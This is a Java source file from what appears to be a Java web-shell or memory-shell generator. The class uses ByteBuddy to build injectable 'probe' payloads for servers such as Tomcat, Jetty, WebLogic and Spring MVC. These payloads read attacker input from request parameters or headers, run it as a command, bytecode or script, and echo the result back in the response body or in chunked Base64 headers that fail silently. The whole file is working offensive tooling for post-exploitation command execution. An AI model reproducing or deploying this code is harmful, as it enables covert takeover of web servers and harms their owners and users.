package com.reajason.javaweb.probe.generator.response;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseConfig;
import com.reajason.javaweb.probe.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.probe.payload.ByteCodeProbe;
import com.reajason.javaweb.probe.payload.CommandProbe;
import com.reajason.javaweb.probe.payload.FilterProbeFactory;
import com.reajason.javaweb.probe.payload.ScriptEngineProbe;
import com.reajason.javaweb.probe.payload.response.*;
import com.reajason.javaweb.utils.NameSampler;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import com.reajason.javaweb.utils.StringUtils;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static java.nio.charset.StandardCharsets.UTF_8;
import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * HTTP 响应回显生成器：ResponseBody 把结果写进响应体，ResponseHeader 把结果写进响应头。
 * 两者共用同一套容器 writer，只在写结果的方式上不同。
 *
 * @author ReaJason
 * @since 2025/6/29
 */
public class ResponseGenerator extends ByteBuddyShellGenerator<ResponseConfig> {
    /**
     * RFC 7230 header-field-name token。
     */
    private static final Pattern HEADER_NAME_PATTERN = Pattern.compile("[!#$%&'*+.^_`|~0-9A-Za-z-]+");

    private static final Map<String, Class<?>> WRITER_CLASSES = createWriterClasses();

    public ResponseGenerator(ProbeConfig probeConfig, ResponseConfig probeContentConfig) {
        super(probeConfig, probeContentConfig);
    }

    public static List<String> getSupportedServers() {
        return new ArrayList<>(WRITER_CLASSES.keySet());
    }

    @Override
    protected DynamicType.Builder<?> build(ByteBuddy buddy) {
        Class<?> getDataFromReqInterceptor = getDataFromReqInterceptor.class;
        String server = probeContentConfig.getServer();
        if (Server.Jetty.equals(server)) {
            getDataFromReqInterceptor = getDataFromReqJettyInterceptor.class;
        }
        if (ProbeContent.Filter.equals(probeConfig.getProbeContent())) {
            probeContentConfig.setBase64Bytes(FilterProbeFactory.getBase64ByServer(server));
        }
        Class<?> writerClass = getWriterClass();
        Class<?> runnerClass = getRunnerClass();
        DynamicType.Builder<?> builder = buddy.redefine(writerClass)
                .name(probeConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(probeConfig.getTargetJreVersion()))
                .visit(Advice.withCustomMapping()
                        .bind(ValueAnnotation.class, probeContentConfig.getCommandTemplate())
                        .to(runnerClass)
                        .on(named("run")));
        String base64Bytes = probeContentConfig.getBase64Bytes();
        if (StringUtils.isNotBlank(base64Bytes)) {
            builder = builder.method(named("getDataFromReq")).intercept(FixedValue.value(base64Bytes));
        } else {
            builder = builder.visit(MethodCallReplaceVisitorWrapper.newInstance("getDataFromReq",
                            probeConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                    .visit(Advice.withCustomMapping().bind(ValueAnnotation.class, probeContentConfig.getReqParamName())
                            .to(getDataFromReqInterceptor).on(named("getDataFromReq")));
        }
        if (ProbeMethod.ResponseHeader.equals(probeConfig.getProbeMethod())) {
            ensureWriteHeaderSupported(writerClass);
            // 与 getDataFromReq 相同：先挂静态调用替换，再挂 Advice，保证内联后的调用也被改写
            builder = builder.visit(MethodCallReplaceVisitorWrapper.newInstance("writeHeader",
                            probeConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                    .visit(Advice.withCustomMapping()
                            .bind(HeaderNameAnnotation.class, resolveHeaderName())
                            .to(writeHeaderInterceptor.class)
                            .on(named("writeHeader")));
        } else {
            // ResponseBody 不使用响应头通道，避免结果里出现一个永远不会被写入的名字
            probeContentConfig.setRespHeaderName(null);
        }
        return builder;
    }

    /**
     * 留空时生成 X- 前缀的随机头名，并写回配置供结果展示；显式传入时校验为合法 header token。
     */
    private String resolveHeaderName() {
        String headerName = probeContentConfig.getRespHeaderName();
        if (StringUtils.isBlank(headerName)) {
            headerName = randomHeaderName();
        } else {
            headerName = headerName.trim();
            if (!HEADER_NAME_PATTERN.matcher(headerName).matches()) {
                throw new GenerationException("invalid response header name: " + headerName);
            }
        }
        probeContentConfig.setRespHeaderName(headerName);
        return headerName;
    }

    private static String randomHeaderName() {
        String word = NameSampler.sampleWord();
        return "X-" + Character.toUpperCase(word.charAt(0)) + word.substring(1);
    }

    private void ensureWriteHeaderSupported(Class<?> writerClass) {
        try {
            writerClass.getDeclaredMethod("writeHeader", Object.class, String.class);
        } catch (NoSuchMethodException e) {
            throw new GenerationException(probeConfig.getProbeMethod().name()
                    + " not supported for server: " + probeContentConfig.getServer());
        }
    }

    private Class<?> getRunnerClass() {
        switch (probeConfig.getProbeContent()) {
            case Command:
                return CommandProbe.class;
            case Bytecode:
            case Filter:
                return ByteCodeProbe.class;
            case ScriptEngine:
                return ScriptEngineProbe.class;
            default:
                throw new GenerationException(probeConfig.getProbeMethod().name()
                        + " not supported for probe content: " + probeConfig.getProbeContent());
        }
    }

    private Class<?> getWriterClass() {
        Class<?> writerClass = WRITER_CLASSES.get(probeContentConfig.getServer());
        if (writerClass == null) {
            throw new GenerationException(probeConfig.getProbeMethod().name()
                    + " not supported for server: " + probeContentConfig.getServer());
        }
        return writerClass;
    }

    private static Map<String, Class<?>> createWriterClasses() {
        Map<String, Class<?>> writerClasses = new LinkedHashMap<>();
        writerClasses.put(Server.Tomcat, TomcatWriter.class);
        writerClasses.put(Server.Jetty, JettyWriter.class);
        writerClasses.put(Server.Jetty5, JettyWriter.class);
        writerClasses.put(Server.Undertow, UndertowWriter.class);
        writerClasses.put(Server.JBoss, TomcatWriter.class);
        writerClasses.put(Server.Resin, ResinWriter.class);
        writerClasses.put(Server.Resin2, Resin2Writer.class);
        writerClasses.put(Server.WebLogic, WebLogicWriter.class);
        writerClasses.put(Server.WebSphere, WebSphereWriter.class);
        writerClasses.put(Server.GlassFish, GlassFishWriter.class);
        writerClasses.put(Server.TongWeb, TongWebWriter.class);
        writerClasses.put(Server.BES, TomcatWriter.class);
        writerClasses.put(Server.InforSuite, GlassFishWriter.class);
        writerClasses.put(Server.Apusic, ApusicWriter.class);
        writerClasses.put(Server.SpringWebMvc, SpringWebMvcWriter.class);
        writerClasses.put(Server.Struts2, Struts2Writer.class);
        return writerClasses;
    }

    static class getDataFromReqInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            String p = null;
            try {
                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
            } catch (Exception ignored) {
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            ret = p;
        }
    }

    static class getDataFromReqJettyInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @ValueAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            String p = null;
            try {
                p = (String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name});
            } catch (Exception e) {
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                try {
                    p = (String) ShellCommonUtil.invokeMethod(request, "getField", new Class[]{String.class}, new Object[]{name});
                } catch (Exception ignored) {
                }
            }
            if (p == null || p.isEmpty()) {
                Class<?> requestClass = request.getClass().getClassLoader().loadClass("org.eclipse.jetty.server.Request");
                Object parameters = requestClass.getMethod("extractQueryParameters", requestClass, Charset.class).invoke(null, request, UTF_8);
                p = (String) ShellCommonUtil.invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{name});
            }
            if (p == null || p.isEmpty()) {
                Object headers = ShellCommonUtil.invokeMethod(request, "getHeaders", null, null);
                p = (String) ShellCommonUtil.invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{name});
            }
            ret = p;
        }
    }

    /**
     * 把结果写进响应头。方法体必须自包含：只能引用 JDK 类型、编译期常量，以及会被
     * {@link MethodCallReplaceVisitorWrapper} 替换到探测马类自身的 ShellCommonUtil.invokeMethod 调用。
     * <p>
     * 编码规则：≤1500 字符且为可安全放入 header 的 ASCII 时原文输出（CR/LF/控制字符归一为空格）；
     * 超过 1500 字符或含非 ASCII 时 UTF-8 Base64，按 1500 字符切分到多个响应头：
     * {@code X-Name}、{@code X-Name-2}…，并附加 {@code X-Name-E: b64}、{@code X-Name-C: 分片数}，
     * 超出 4 片时截断并写 {@code X-Name-T: 1}。
     * <p>
     * 无论写入是否成功都返回 true：ResponseHeader 是严格 header-only，绝不回落到响应体。
     */
    static class writeHeaderInterceptor {
        @Advice.OnMethodExit
        public static void exit(@Advice.Argument(0) Object response,
                                @Advice.Argument(1) String result,
                                @HeaderNameAnnotation String headerName,
                                @Advice.Return(readOnly = false) boolean ret) {
            // strict header-only：即使下面任何一步失败，也不允许 writer 继续走响应体分支
            ret = true;
            if (response == null || headerName == null || headerName.length() == 0) {
                return;
            }
            try {
                String text = result == null ? "" : result;
                String value = null;
                boolean encoded = false;
                if (text.length() <= 1500) {
                    StringBuilder plain = new StringBuilder(text.length());
                    boolean unsafe = false;
                    for (int i = 0; i < text.length(); i++) {
                        char c = text.charAt(i);
                        if (c == '\r' || c == '\n' || c == '\t' || c < 0x20 || c == 0x7f) {
                            plain.append(' ');
                        } else if (c > 0x7e) {
                            // 非 ASCII 放进 header 会被按 ISO-8859-1 曲解，改走 Base64
                            unsafe = true;
                            break;
                        } else {
                            plain.append(c);
                        }
                    }
                    if (!unsafe) {
                        value = plain.toString().trim();
                    }
                }
                if (value == null) {
                    encoded = true;
                    try {
                        Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
                        value = (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                                .invoke(encoder, text.getBytes("UTF-8"));
                    } catch (Throwable ignored) {
                        Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
                        Object encoder = encoderClass.newInstance();
                        value = (String) encoderClass.getMethod("encodeBuffer", byte[].class)
                                .invoke(encoder, text.getBytes("UTF-8"));
                    }
                    // JDK6 的 sun.misc.BASE64Encoder 会按 72 字符折行（换行符取决于平台），
                    // 头值里出现 CR/LF 会截断 HTTP 头块，必须压成一行
                    StringBuilder compact = new StringBuilder(value.length());
                    for (int i = 0; i < value.length(); i++) {
                        char c = value.charAt(i);
                        if (c != '\r' && c != '\n') {
                            compact.append(c);
                        }
                    }
                    value = compact.toString();
                }

                String[] names = new String[8];
                String[] values = new String[8];
                int count = 0;
                if (!encoded) {
                    names[count] = headerName;
                    values[count] = value;
                    count++;
                } else {
                    int chunkSize = 1500;
                    int totalChunks = (value.length() + chunkSize - 1) / chunkSize;
                    if (totalChunks == 0) {
                        totalChunks = 1;
                    }
                    int maxChunks = 4;
                    boolean truncated = totalChunks > maxChunks;
                    int writeChunks = truncated ? maxChunks : totalChunks;
                    for (int i = 0; i < writeChunks; i++) {
                        int start = i * chunkSize;
                        int end = start + chunkSize;
                        if (end > value.length()) {
                            end = value.length();
                        }
                        names[count] = i == 0 ? headerName : headerName + "-" + (i + 1);
                        values[count] = value.substring(start, end);
                        count++;
                    }
                    names[count] = headerName + "-E";
                    values[count] = "b64";
                    count++;
                    if (writeChunks > 1) {
                        names[count] = headerName + "-C";
                        values[count] = String.valueOf(writeChunks);
                        count++;
                    }
                    if (truncated) {
                        names[count] = headerName + "-T";
                        values[count] = "1";
                        count++;
                    }
                }

                for (int i = 0; i < count; i++) {
                    try {
                        ShellCommonUtil.invokeMethod(response, "setHeader",
                                new Class[]{String.class, String.class}, new Object[]{names[i], values[i]});
                    } catch (Throwable ignored) {
                        // Jetty 12 core Response 不是 HttpServletResponse，也没有 setHeader；
                        // Jetty 5/6 没有 setHeader，但可以通过 getHeader() 拿到 HttpFields。
                        try {
                            Object headers;
                            try {
                                headers = ShellCommonUtil.invokeMethod(response, "getHeaders", null, null);
                            } catch (Throwable ignored2) {
                                try {
                                    headers = ShellCommonUtil.invokeMethod(response, "getHeader", null, null);
                                } catch (Throwable ignored3) {
                                    headers = response.getClass().getMethod("getHeaders").invoke(response);
                                }
                            }
                            Class<?> mutableClass;
                            try {
                                mutableClass = Class.forName("org.eclipse.jetty.http.HttpFields$Mutable", false,
                                        headers.getClass().getClassLoader());
                            } catch (Throwable ignored2) {
                                mutableClass = headers.getClass();
                            }
                            java.lang.reflect.Method put =
                                    mutableClass.getMethod("put", String.class, String.class);
                            put.setAccessible(true);
                            put.invoke(headers, names[i], values[i]);
                        } catch (Throwable ignored2) {
                        }
                    }
                }
            } catch (Throwable ignored) {
                // 严格 header-only：静默失败，不回落到响应体
            }
        }
    }

    @Retention(RetentionPolicy.RUNTIME)
    public @interface ValueAnnotation {
    }

    @Retention(RetentionPolicy.RUNTIME)
    public @interface HeaderNameAnnotation {
    }
}
